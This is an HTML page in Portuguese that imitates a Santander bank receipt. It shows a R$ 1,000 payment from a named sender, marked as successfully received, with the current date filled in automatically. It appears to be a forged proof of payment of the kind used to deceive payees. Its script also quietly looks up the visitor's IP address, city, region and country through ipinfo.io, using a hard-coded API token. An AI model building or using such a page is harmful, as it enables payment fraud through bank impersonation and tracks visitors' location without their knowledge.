<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante de Recebimento - Santander</title>
</head>

<body>
  <div class="comprovante-container">
    <h1>Comprovante de Recebimento - Santander</h1>

    <div class="informacoes">
      <p><span>Data:</span> <span id="data-atual"></span></p>
      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
      <p><span>De:</span> João Silva de Oliveira</p>
      <p><span>Status:</span> Recebido com Sucesso</p>
    </div>

    <button class="botao" onclick="window.print()">Imprimir</button>

    <div class="comprovante-footer">
      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
      <p><a href="#">Clique aqui</a> para mais informações.</p>
    </div>
  </div>

  <script>
    // Apenas exibe a data atual
    const dataAtual = new Date();
    const dia = String(dataAtual.getDate()).padStart(2, '0');
    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
    const ano = dataAtual.getFullYear();

    const dataFormatada = `${dia}/${mes}/${ano}`;

    document.getElementById("data-atual").textContent = dataFormatada;

    // Coleta de localização com IP utilizando o token fornecido
    fetch('https://ipinfo.io/json?token=1aa74ee0199100')
      .then(response => response.json())
      .then(data => {
        console.log('Localização via IP:', data);
        // Exibe os dados de localização do usuário (latitude, longitude, cidade, etc)
        alert(`Localização estimada:\nIP: ${data.ip}\nCidade: ${data.city}\nRegião: ${data.region}\nPaís: ${data.country}`);
      })
      .catch(error => {
        console.error('Erro ao obter localização via IP:', error);
      });
  </script>
</body>

</html>
